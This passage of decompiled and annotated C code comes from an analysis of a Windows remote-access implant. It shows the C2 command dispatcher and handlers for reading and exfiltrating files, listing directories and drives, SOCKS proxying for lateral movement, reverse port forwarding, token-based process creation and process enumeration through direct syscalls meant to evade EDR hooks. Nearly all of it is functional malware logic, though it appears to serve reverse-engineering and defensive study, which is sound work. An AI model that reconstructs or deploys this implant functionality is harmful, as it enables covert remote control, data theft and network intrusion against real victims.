              cmd_38_reverse_port_forward_setup(param_1,uVar2,piVar3,param_4);
              break;
            case 0x27:
              cmd_39_reverse_port_forward_relay(param_1,uVar2,piVar3,param_4);
              break;
            case 0x29:
              cmd_41_process_list(param_1,uVar2,piVar3,param_4);
              break;
            case 0x2a:
              cmd_42_kill_process(param_1,uVar2,piVar3,param_4);
              break;
            case 0x2b:
              cmd_43_execute_command(param_1,uVar2,piVar3,param_4);
              break;
            case 0x2e:
              cmd_46_list_jobs(param_1,uVar2,piVar3,param_4);
              break;
            case 0x2f:
              cmd_47_kill_job(param_1,uVar2,piVar3,param_4);
              break;
            case 0x32:
              cmd_50_socks_proxy_setup(param_1,uVar2,piVar3,param_4);
              break;
            case 0x3e:
              cmd_62_p2p_link_setup(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x3f:
              cmd_63_p2p_link_connect(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x40:
              cmd_64_p2p_link_data_relay(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x41:
              cmd_65_p2p_link_write(param_1,(ulonglong)uVar2,piVar3);
              break;
            case 0x42:
              cmd_66_p2p_link_op(param_1,(ulonglong)uVar2,piVar3);
              break;
            case 0x43:
              cmd_67_p2p_link_op2(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x45:
              cmd_69_p2p_link_disconnect(param_1,(ulonglong)uVar2,piVar3);
              break;
            case 0x46:
              cmd_70_p2p_link_close(param_1,(ulonglong)uVar2,piVar3);
              break;
            case 0x47:
              cmd_71_spawn_interactive_shell(param_1,(ulonglong)uVar2,piVar3,param_4);
              break;
            case 0x48:
              cmd_72_write_stdin_to_pipe(param_1,(ulonglong)uVar2,piVar3);
            }
          }
        }
        else if (uVar2 == 0x2321) {
          cmd_9009_special(param_1,0x2321,piVar3);
        }
      }
      if ((piVar3 != (int *)0x0) && (piVar3 != (int *)0x0)) {
        binary_buffer_free_data();
        binary_buffer_free((longlong)piVar3);
      }
    }
  }
  return;
}



/* cmd_24_read_file @ 35d448dd8 */

void cmd_24_read_file(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong unaff_GS_OFFSET;
  undefined8 in_stack_ffffffffffffff88;
  undefined4 uVar1;
  undefined8 *local_58;
  uint local_50;
  uint local_4c;
  longlong local_48;
  undefined4 local_3c;
  longlong local_38;
  undefined4 local_2c;
  int local_28;
  uint local_24;
  longlong local_20;
  undefined4 local_14;
  undefined8 *local_10;
  
  uVar1 = (undefined4)((ulonglong)in_stack_ffffffffffffff88 >> 0x20);
  local_4c = 0;
  local_10 = (undefined8 *)FUN_35d44f62e(param_3,&local_4c);
  local_14 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_14);
  local_20 = (**(code **)(g_win32_api_table + 0x10))(local_10,0x80000000,0,0,CONCAT44(uVar1,3),0,0);
  if ((local_20 == 0) || (local_20 == -1)) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_2c = 0x30;
    local_38 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_38 + 0x68));
  }
  else {
    local_24 = 0x800;
    local_50 = 0;
    local_58 = (undefined8 *)heap_alloc(0x800);
    local_28 = (**(code **)(g_win32_api_table + 0x198))(local_20,local_58,local_24,&local_50,0);
    if (local_28 == 0) {
      binary_buffer_write_uint32(param_4,0x1111ffff);
      local_3c = 0x30;
      local_48 = *(longlong *)(unaff_GS_OFFSET + 0x30);
      binary_buffer_write_uint32(param_4,*(undefined4 *)(local_48 + 0x68));
    }
    else {
      binary_buffer_write_uint32(param_4,param_2);
      binary_buffer_write_bytes(param_4,local_10,local_4c);
      binary_buffer_write_bytes(param_4,local_58,local_50);
    }
    if (local_20 != 0) {
      (*(code *)*g_syscall_table)(local_20);
      local_20 = 0;
    }
    if (local_58 != (undefined8 *)0x0) {
      heap_realloc((longlong *)&local_58,local_24);
    }
  }
  return;
}



/* cmd_08_change_dir @ 35d448fc6 */

void cmd_08_change_dir(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong lVar1;
  undefined8 *puVar2;
  longlong unaff_GS_OFFSET;
  undefined8 local_140;
  undefined8 local_138;
  undefined8 local_130 [31];
  uint local_34;
  longlong local_30;
  undefined4 local_28;
  uint local_24;
  int local_20;
  undefined4 local_1c;
  longlong local_18;
  
  local_34 = 0;
  local_18 = FUN_35d44f62e(param_3,&local_34);
  local_1c = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_1c);
  local_20 = (**(code **)(g_win32_api_table + 0x1b0))(local_18);
  if (local_20 == 0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_28 = 0x30;
    local_30 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_30 + 0x68));
  }
  else {
    local_140 = 0;
    local_138 = 0;
    puVar2 = local_130;
    for (lVar1 = 0x1e; lVar1 != 0; lVar1 = lVar1 + -1) {
      *puVar2 = 0;
      puVar2 = puVar2 + 1;
    }
    *(undefined4 *)puVar2 = 0;
    local_24 = (**(code **)(g_win32_api_table + 0x98))(0x104,&local_140);
    binary_buffer_write_uint32(param_4,param_2);
    binary_buffer_write_bytes(param_4,&local_140,local_24);
  }
  return;
}



/* cmd_12_move_rename_file @ 35d449136 */

void cmd_12_move_rename_file(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong unaff_GS_OFFSET;
  uint local_38 [2];
  longlong local_30;
  undefined4 local_24;
  int local_20;
  undefined4 local_1c;
  longlong local_18;
  longlong local_10;
  
  local_38[1] = 0;
  local_10 = FUN_35d44f62e(param_3,local_38 + 1);
  local_38[0] = 0;
  local_18 = FUN_35d44f62e(param_3,local_38);
  local_1c = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_1c);
  local_20 = (*(code *)*g_win32_api_table)(local_10,local_18,0);
  if (local_20 == 0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_24 = 0x30;
    local_30 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_30 + 0x68));
  }
  else {
    binary_buffer_write_uint32(param_4,param_2);
  }
  return;
}



/* cmd_15_drive_listing @ 35d449216 */

void cmd_15_drive_listing(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong unaff_GS_OFFSET;
  undefined4 local_34;
  longlong local_30;
  undefined4 local_24;
  undefined4 local_20;
  uint local_1c;
  uint local_18;
  undefined4 local_14;
  char local_d;
  int local_c;
  
  local_14 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_14);
  binary_buffer_write_uint32(param_4,param_2);
  local_18 = (**(code **)(g_win32_api_table + 0xd8))();
  if (local_18 == 0) {
    binary_buffer_write_byte(param_4,0);
    local_24 = 0x30;
    local_30 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_30 + 0x68));
  }
  else {
    binary_buffer_write_byte(param_4,1);
    local_c = 0;
    local_1c = binary_buffer_get_size((longlong)param_4);
    binary_buffer_write_uint32(param_4,0);
    for (local_d = 'A'; local_d < '['; local_d = local_d + '\x01') {
      if ((1 << (local_d + 0xbfU & 0x1f) & local_18) != 0) {
        local_34 = CONCAT31(0x5c3a,local_d);
        local_20 = (**(code **)(g_win32_api_table + 0xa0))(&local_34);
        binary_buffer_write_byte(param_4,local_d);
        binary_buffer_write_uint32(param_4,local_20);
        local_c = local_c + 1;
      }
    }
    binary_buffer_reset((longlong)param_4,local_1c,local_c);
  }
  return;
}



/* cmd_32_file_download_chunked @ 35d449384 */

void cmd_32_file_download_chunked(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  longlong unaff_GS_OFFSET;
  undefined8 in_stack_fffffffffffffe40;
  undefined4 uVar1;
  undefined8 local_1a0;
  undefined8 local_190;
  undefined8 local_170 [34];
  undefined4 local_60;
  uint local_5c;
  longlong local_58;
  undefined4 local_4c;
  longlong local_48;
  undefined4 local_3c;
  undefined8 local_38;
  undefined4 local_30;
  uint local_2c;
  longlong local_28;
  undefined4 local_1c;
  longlong local_18;
  
  uVar1 = (undefined4)((ulonglong)in_stack_fffffffffffffe40 >> 0x20);
  local_5c = 0;
  local_18 = FUN_35d44f62e(param_3,&local_5c);
  local_1c = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_1c);
  local_28 = (**(code **)(g_win32_api_table + 0x10))(local_18,0x80000000,1,0,CONCAT44(uVar1,3),0,0);
  if ((local_28 == 0) || (local_28 == -1)) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_3c = 0x30;
    local_48 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_48 + 0x68));
  }
  else {
    local_2c = (**(code **)(g_win32_api_table + 200))(local_18,0x104,local_170,0);
    local_60 = 0;
    local_30 = (**(code **)(g_win32_api_table + 0xb8))(local_28,&local_60);
    local_38 = CONCAT44(local_60,local_30);
    if (local_2c == 0) {
      binary_buffer_write_uint32(param_4,0x1111ffff);
      local_4c = 0x30;
      local_58 = *(longlong *)(unaff_GS_OFFSET + 0x30);
      binary_buffer_write_uint32(param_4,*(undefined4 *)(local_58 + 0x68));
    }
    else {
      FUN_35d44d590(&local_1a0,*(longlong **)(*param_1 + 0x18),local_1c,local_28,local_38);
      binary_buffer_write_uint32(param_4,0x20);
      binary_buffer_write_uint32(param_4,local_1a0._4_4_);
      binary_buffer_write_byte(param_4,1);
      FUN_35d44f088(param_4,local_190);
      binary_buffer_write_bytes(param_4,local_170,local_2c);
    }
  }
  return;
}



/* cmd_35_modify_job @ 35d44961e */

void cmd_35_modify_job(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  bool bVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 uVar4;
  longlong lVar5;
  ulonglong uVar6;
  undefined4 local_20;
  
  uVar2 = binary_reader_read_uint32(param_3);
  iVar3 = binary_reader_read_uint32(param_3);
  uVar4 = binary_reader_read_uint32(param_3);
  bVar1 = false;
  local_20 = 0;
  do {
    uVar6 = FUN_35d456cf0(*(longlong *)(*param_1 + 0x18));
    if (uVar6 <= (ulonglong)(longlong)local_20) {
LAB_35d4496ee:
      binary_buffer_write_uint32(param_4,uVar4);
      if (bVar1) {
        binary_buffer_write_uint32(param_4,0x23);
        binary_buffer_write_uint32(param_4,iVar3);
        binary_buffer_write_byte(param_4,(char)uVar2);
      }
      else {
        binary_buffer_write_uint32(param_4,0x1111ffff);
        binary_buffer_write_uint32(param_4,2);
      }
      return;
    }
    lVar5 = FUN_35d456070(*(longlong **)(*param_1 + 0x18),(longlong)local_20);
    if (iVar3 == *(int *)(lVar5 + 4)) {
      lVar5 = FUN_35d456070(*(longlong **)(*param_1 + 0x18),(longlong)local_20);
      *(char *)(lVar5 + 0x20) = (char)uVar2;
      bVar1 = true;
      goto LAB_35d4496ee;
    }
    local_20 = local_20 + 1;
  } while( true );
}



/*
 * cmd_50_socks_proxy_setup @ 35d449760
 *
 * Initializes a SOCKS4/5 proxy tunnel for lateral movement into internal
 * networks. The operator's traffic is tunneled through the implant to
 * reach hosts that lack direct internet access. Works with the SOCKS
 * proxy subsystem (g_socks_proxy) and relay commands (37, 38, 39).
 */

void cmd_50_socks_proxy_setup(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  bool bVar1;
  int iVar2;
  uint uVar3;
  undefined8 uVar4;
  undefined8 *puVar5;
  longlong unaff_GS_OFFSET;
  uint local_6c;
  uint local_68 [2];
  longlong local_60;
  undefined4 local_54;
  ulonglong *local_50;
  undefined4 *local_48;
  undefined4 local_3c;
  undefined8 *local_38;
  undefined8 *local_30;
  undefined8 *local_28;
  uint local_1c;
  
  local_1c = binary_reader_read_byte(param_3);
  local_1c = local_1c & 0xff;
  local_68[1] = 0;
  local_28 = (undefined8 *)FUN_35d44f62e(param_3,local_68 + 1);
  local_68[0] = 0;
  local_30 = (undefined8 *)FUN_35d44f62e(param_3,local_68);
  local_6c = 0;
  local_38 = (undefined8 *)FUN_35d44f62e(param_3,&local_6c);
  local_3c = binary_reader_read_uint32(param_3);
  if (g_socks_proxy == (longlong *)0x0) {
    binary_buffer_write_uint32(param_4,local_3c);
    binary_buffer_write_uint32(param_4,0x1111ffff);
    binary_buffer_write_uint32(param_4,0x32);
    return;
  }
  if (local_1c == 0) {
    local_48 = (undefined4 *)
               token_create_process_as_user(local_3c,(longlong)local_28,(longlong)local_30,(ulonglong)local_68[0],
                             local_38,local_6c);
    if ((local_48 == (undefined4 *)0x0) || (iVar2 = binary_buffer_get_size((longlong)local_48), iVar2 == 0))
    {
      bVar1 = false;
    }
    else {
      bVar1 = true;
    }
    if (bVar1) {
      uVar3 = binary_buffer_get_size((longlong)local_48);
      puVar5 = (undefined8 *)binary_buffer_get_data_ptr((longlong)local_48);
      FUN_35d44f3ae(param_4,puVar5,uVar3);
    }
    binary_buffer_write_uint32(param_4,local_3c);
    binary_buffer_write_uint32(param_4,param_2);
    binary_buffer_write_byte(param_4,0);
    if (local_48 != (undefined4 *)0x0) {
      binary_buffer_set_flag(local_48,1);
    }
    return;
  }
  local_50 = socks_proxy_process_connection(g_socks_proxy,local_3c,local_28,local_30,local_68[0],local_38,local_6c);
  if (local_50 == (ulonglong *)0x0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    binary_buffer_write_uint32(param_4,8);
    return;
  }
  uVar4 = socks_proxy_handle_request(g_socks_proxy,(longlong)local_50);
  if ((int)uVar4 != 0) {
    return;
  }
  binary_buffer_write_uint32(param_4,0x1111ffff);
  local_54 = 0x30;
  local_60 = *(longlong *)(unaff_GS_OFFSET + 0x30);
  binary_buffer_write_uint32(param_4,*(undefined4 *)(local_60 + 0x68));
  return;
}



/* cmd_22_get_user_info @ 35d4499d8 */

void cmd_22_get_user_info(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong unaff_GS_OFFSET;
  undefined4 local_4c;
  undefined8 *local_48;
  undefined4 local_3c;
  undefined8 *local_38;
  undefined4 local_2c;
  longlong local_28;
  undefined4 local_1c;
  longlong local_18;
  undefined4 local_10;
  int local_c;
  
  local_10 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_10);
  local_c = 0;
  local_2c = 0;
  local_38 = (undefined8 *)heap_alloc(0x200);
  local_3c = 0x200;
  local_48 = (undefined8 *)heap_alloc(0x200);
  local_4c = 0x200;
  local_18 = FUN_35d454603();
  if (local_18 != 0) {
    local_c = FUN_35d4546aa(local_18,local_38,&local_3c,local_48,&local_4c,&local_2c);
  }
  if (local_c == 0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_1c = 0x30;
    local_28 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_28 + 0x68));
  }
  else {
    binary_buffer_write_uint32(param_4,param_2);
    binary_buffer_write_byte(param_4,(char)local_2c);
    binary_buffer_write_string(param_4,local_48);
    binary_buffer_write_string(param_4,local_38);
  }
  if (local_18 != 0) {
    (*(code *)*g_syscall_table)(local_18);
  }
  heap_realloc((longlong *)&local_38,0x200);
  heap_realloc((longlong *)&local_48,0x200);
  return;
}



/* cmd_46_list_jobs @ 35d449b44 */

void cmd_46_list_jobs(longlong *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  undefined2 uVar1;
  undefined2 uVar2;
  undefined4 uVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  undefined4 *puVar6;
  longlong lVar7;
  undefined8 *puVar8;
  ulonglong local_18;
  uint local_10;
  uint local_c;
  
  uVar3 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,uVar3);
  binary_buffer_write_uint32(param_4,param_2);
  uVar4 = FUN_35d456d10(*(longlong *)(*param_1 + 0x20));
  local_c = 0;
  if (g_socks_proxy != (longlong *)0x0) {
    (**(code **)(g_win32_api_table + 0x58))(g_socks_proxy + 5);
  }
  if (g_socks_proxy != (longlong *)0x0) {
    uVar5 = FUN_35d456d50((longlong)g_socks_proxy);
    local_c = (uint)uVar5;
  }
  binary_buffer_write_uint32(param_4,(uint)uVar4 + local_c);
  for (local_10 = 0; local_10 < (uint)uVar4; local_10 = local_10 + 1) {
    puVar6 = (undefined4 *)FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)(int)local_10);
    uVar3 = *puVar6;
    lVar7 = FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)(int)local_10);
    uVar1 = *(undefined2 *)(lVar7 + 4);
    lVar7 = FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)(int)local_10);
    uVar2 = *(undefined2 *)(lVar7 + 0x10);
    binary_buffer_write_uint32(param_4,uVar3);
    binary_buffer_write_uint16(param_4,uVar1);
    binary_buffer_write_uint16(param_4,uVar2);
  }
  if (g_socks_proxy != (longlong *)0x0) {
    for (local_18 = 0; local_18 < local_c; local_18 = local_18 + 1) {
      puVar8 = (undefined8 *)FUN_35d456a80(g_socks_proxy,local_18);
      binary_buffer_write_uint32(param_4,*(undefined4 *)*puVar8);
      binary_buffer_write_uint16(param_4,5);
      binary_buffer_write_uint16(param_4,0);
    }
    (**(code **)(g_win32_api_table + 0x178))(g_socks_proxy + 5);
  }
  return;
}



/* cmd_47_kill_job @ 35d449d64 */

void cmd_47_kill_job(longlong *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  int iVar1;
  undefined4 uVar2;
  undefined8 uVar3;
  int *piVar4;
  longlong lVar5;
  uint local_10;
  undefined1 local_c;
  
  iVar1 = binary_reader_read_uint32(param_3);
  uVar2 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,uVar2);
  binary_buffer_write_uint32(param_4,param_2);
  local_c = false;
  uVar3 = FUN_35d456d10(*(longlong *)(*param_1 + 0x20));
  local_10 = 0;
  do {
    if ((uint)uVar3 <= local_10) {
LAB_35d449e3a:
      if ((!(bool)local_c) && (g_socks_proxy != (longlong *)0x0)) {
        uVar3 = socks_proxy_connect_target(g_socks_proxy,iVar1);
        local_c = (undefined1)uVar3;
      }
      binary_buffer_write_byte(param_4,local_c);
      binary_buffer_write_uint32(param_4,iVar1);
      return;
    }
    piVar4 = (int *)FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)(int)local_10);
    if (iVar1 == *piVar4) {
      lVar5 = FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)(int)local_10);
      *(undefined2 *)(lVar5 + 6) = 3;
      local_c = true;
      goto LAB_35d449e3a;
    }
    local_10 = local_10 + 1;
  } while( true );
}



/* cmd_38_reverse_port_forward_setup @ 35d449e8c */

void cmd_38_reverse_port_forward_setup(longlong *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  undefined4 uVar1;
  uint local_34 [3];
  longlong local_28;
  undefined4 local_20;
  ushort local_1a;
  longlong local_18;
  int local_c;
  
  local_c = binary_reader_read_uint32(param_3);
  if (local_c == 1) {
    local_34[1] = 0;
    local_28 = FUN_35d44f62e(param_3,local_34 + 1);
    local_34[2] = binary_reader_read_uint32(param_3);
    FUN_35d44f7ae(*(longlong **)(*param_1 + 0x38),local_34[2],param_2,local_28,param_4);
  }
  else if (local_c == 2) {
    local_34[0] = 0;
    local_18 = FUN_35d44f62e(param_3,local_34);
    uVar1 = binary_reader_read_uint32(param_3);
    local_1a = (ushort)uVar1;
    local_20 = binary_reader_read_uint32(param_3);
    FUN_35d44fcac(*(longlong **)(*param_1 + 0x38),local_20,param_2,local_18,local_1a,param_4);
  }
  return;
}



/* cmd_14_directory_listing @ 35d449f80 */

void cmd_14_directory_listing(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  bool bVar1;
  byte bVar2;
  int iVar3;
  longlong lVar4;
  uint *puVar5;
  longlong unaff_GS_OFFSET;
  undefined8 local_2b8;
  uint local_2b0 [5];
  undefined8 local_29c;
  undefined4 local_294;
  undefined4 local_290;
  char local_284;
  char local_283;
  undefined8 local_170;
  uint local_64;
  longlong local_60;
  undefined4 local_54;
  longlong local_50;
  undefined4 local_48;
  uint local_44;
  uint local_40;
  uint local_3c;
  longlong local_38;
  uint local_2c;
  uint local_28;
  undefined4 local_24;
  undefined1 *local_20;
  int local_18;
  uint local_14;
  
  local_64 = 0;
  local_20 = (undefined1 *)FUN_35d44f62e(param_3,&local_64);
  local_24 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_24);
  binary_buffer_write_uint32(param_4,param_2);
  local_14 = 0x104;
  if ((local_64 == 3) && (local_20[1] == ':')) {
    local_170._0_1_ = *local_20;
    local_170._1_1_ = local_20[1];
    local_14 = 2;
  }
  else {
    local_14 = (**(code **)(g_win32_api_table + 200))(local_20,0x104,&local_170,0);
    if ((0x104 < local_14 + 2) || (local_14 == 0)) {
      binary_buffer_write_byte(param_4,0);
      local_48 = 0x30;
      local_50 = *(longlong *)(unaff_GS_OFFSET + 0x30);
      binary_buffer_write_uint32(param_4,*(undefined4 *)(local_50 + 0x68));
      return;
    }
  }
  local_28 = (**(code **)(g_win32_api_table + 0xc0))(&local_170);
  if ((local_28 == 0xffffffff) || ((local_28 & 0x10) != 0)) {
    bVar2 = 0;
  }
  else {
    bVar2 = 1;
  }
  local_2c = (uint)bVar2;
  if (local_2c == 0) {
    *(undefined1 *)((longlong)&local_170 + (ulonglong)local_14) = 0x5c;
    local_14 = local_14 + 1;
    *(undefined1 *)((longlong)&local_170 + (ulonglong)local_14) = 0x2a;
    local_14 = local_14 + 1;
    *(undefined1 *)((longlong)&local_170 + (ulonglong)local_14) = 0;
  }
  puVar5 = local_2b0;
  for (lVar4 = 0x28; lVar4 != 0; lVar4 = lVar4 + -1) {
    puVar5[0] = 0;
    puVar5[1] = 0;
    puVar5 = puVar5 + 2;
  }
  local_38 = (**(code **)(g_win32_api_table + 0x70))(&local_170,local_2b0);
  if (local_38 == -1) {
    binary_buffer_write_byte(param_4,0);
    local_54 = 0x30;
    local_60 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_60 + 0x68));
  }
  else {
    binary_buffer_write_byte(param_4,1);
    binary_buffer_write_string(param_4,&local_170);
    local_18 = 0;
    local_3c = binary_buffer_get_size((longlong)param_4);
    binary_buffer_write_uint32(param_4,0);
    do {
      local_40 = (uint)((local_2b0[0] & 0x10) != 0);
      if (((local_40 == 0) || (iVar3 = strlen_wrapper((longlong)&local_284), iVar3 != 1)) ||
         (local_284 != '.')) {
        bVar1 = false;
      }
      else {
        bVar1 = true;
      }
      if (!bVar1) {
        if (((local_40 == 0) || (iVar3 = strlen_wrapper((longlong)&local_284), iVar3 != 2)) ||
           ((local_284 != '.' || (local_283 != '.')))) {
          bVar1 = false;
        }
        else {
          bVar1 = true;
        }
        if (!bVar1) {
          local_2b8 = CONCAT44(local_294,local_290);
          local_44 = string_copy(local_29c);
          binary_buffer_write_byte(param_4,(char)local_40);
          FUN_35d44f088(param_4,local_2b8);
          binary_buffer_write_uint32(param_4,local_44);
          binary_buffer_write_string(param_4,(undefined8 *)&local_284);
          local_18 = local_18 + 1;
        }
      }
      if ((local_2c == 0) &&
         (iVar3 = (**(code **)(g_win32_api_table + 0x78))(local_38,local_2b0), iVar3 != 0)) {
        bVar1 = true;
      }
      else {
        bVar1 = false;
      }
    } while (bVar1);
    (**(code **)(g_win32_api_table + 0x68))(local_38);
    binary_buffer_reset((longlong)param_4,local_3c,local_18);
  }
  return;
}



/* cmd_27_create_directory @ 35d44a42e */

void cmd_27_create_directory(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong unaff_GS_OFFSET;
  uint local_2c;
  longlong local_28;
  undefined4 local_1c;
  int local_18;
  undefined4 local_14;
  undefined8 *local_10;
  
  local_2c = 0;
  local_10 = (undefined8 *)FUN_35d44f62e(param_3,&local_2c);
  local_14 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_14);
  local_18 = (**(code **)(g_win32_api_table + 8))(local_10,0);
  if (local_18 == 0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_1c = 0x30;
    local_28 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_28 + 0x68));
  }
  else {
    binary_buffer_write_uint32(param_4,param_2);
    binary_buffer_write_bytes(param_4,local_10,local_2c);
  }
  return;
}



/* cmd_18_move_rename_alt @ 35d44a504 */

void cmd_18_move_rename_alt(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong unaff_GS_OFFSET;
  uint local_38 [2];
  longlong local_30;
  undefined4 local_24;
  int local_20;
  undefined4 local_1c;
  longlong local_18;
  longlong local_10;
  
  local_38[1] = 0;
  local_10 = FUN_35d44f62e(param_3,local_38 + 1);
  local_38[0] = 0;
  local_18 = FUN_35d44f62e(param_3,local_38);
  local_1c = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_1c);
  local_20 = (**(code **)(g_win32_api_table + 0x180))(local_10,local_18);
  if (local_20 == 0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_24 = 0x30;
    local_30 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_30 + 0x68));
  }
  else {
    binary_buffer_write_uint32(param_4,param_2);
  }
  return;
}



/* cmd_37_write_socks_data @ 35d44a5e2 */

void cmd_37_write_socks_data(longlong *param_1,undefined8 param_2,int *param_3)

{
  uint local_20;
  undefined4 local_1c;
  longlong local_18;
  int local_c;
  
  local_c = binary_reader_read_uint32(param_3);
  local_20 = 0;
  local_18 = FUN_35d44f62e(param_3,&local_20);
  local_1c = binary_reader_read_uint32(param_3);
  FUN_35d45023e(*(longlong **)(*param_1 + 0x38),local_c,local_18,local_20);
  return;
}



/* cmd_21_update_config @ 35d44a65a */

void cmd_21_update_config(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  
  iVar1 = binary_reader_read_uint32(param_3);
  if (iVar1 == 1) {
    uVar2 = binary_reader_read_uint32(param_3);
    uVar3 = binary_reader_read_uint32(param_3);
    uVar4 = binary_reader_read_uint32(param_3);
    *(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x10) = uVar2;
    *(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x14) = uVar3;
    binary_buffer_write_uint32(param_4,uVar4);
    binary_buffer_write_uint32(param_4,0x15);
    binary_buffer_write_uint32(param_4,1);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x10));
    binary_buffer_write_uint32(param_4,*(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x14));
  }
  else if (iVar1 == 2) {
    uVar2 = binary_reader_read_uint32(param_3);
    uVar3 = binary_reader_read_uint32(param_3);
    *(undefined4 *)(*(longlong *)(*param_1 + 0x18) + 0x20) = uVar2;
    binary_buffer_write_uint32(param_4,uVar3);
    binary_buffer_write_uint32(param_4,0x15);
    binary_buffer_write_uint32(param_4,2);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(*(longlong *)(*param_1 + 0x18) + 0x20));
  }
  else if (iVar1 == 3) {
    uVar2 = binary_reader_read_uint32(param_3);
    uVar3 = binary_reader_read_uint32(param_3);
    *(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x18) = uVar2;
    binary_buffer_write_uint32(param_4,uVar3);
    binary_buffer_write_uint32(param_4,0x15);
    binary_buffer_write_uint32(param_4,3);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x18));
  }
  else if (iVar1 == 4) {
    uVar2 = binary_reader_read_uint32(param_3);
    uVar3 = binary_reader_read_uint32(param_3);
    *(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x1c) = uVar2;
    binary_buffer_write_uint32(param_4,uVar3);
    binary_buffer_write_uint32(param_4,0x15);
    binary_buffer_write_uint32(param_4,4);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x1c));
  }
  return;
}



/*
 * cmd_41_process_list @ 35d44a8c6
 *
 * Enumerates all processes via NtQuerySystemInformation (direct syscall,
 * bypasses EDR hooks). For each process: PID, parent PID, image name,
 * session ID. Also opens process tokens to extract user/domain and
 * elevation status. Results serialized back to C2.
 */

void cmd_41_process_list(undefined8 *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong lVar1;
  undefined8 *puVar2;
  undefined1 local_3d0 [16];
  undefined1 local_3c0 [16];
  undefined1 local_3b0 [16];
  ulonglong local_3a0 [2];
  undefined8 local_390 [32];
  ulonglong local_290 [2];
  undefined8 local_280 [32];
  ulonglong local_180 [2];
  undefined8 local_170 [31];
  longlong local_78;
  undefined8 local_70;
  undefined8 local_68;
  longlong local_60;
  longlong local_58;
  uint local_50;
  uint local_4c [3];
  uint *local_40;
  int local_34;
  uint local_30;
  undefined4 local_2c;
  undefined1 local_25;
  undefined4 local_24;
  int local_20;
  int local_1c;
  uint *local_18;
  
  local_2c = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_2c);
  binary_buffer_write_uint32(param_4,param_2);
  local_18 = (uint *)0x0;
  local_40 = (uint *)0x0;
  local_4c[2] = 0;
  local_1c = (*(code *)g_syscall_table[4])(5,0,0,local_4c + 2);
  if (local_1c < 0) {
    local_4c[2] = local_4c[2] + 0x1000;
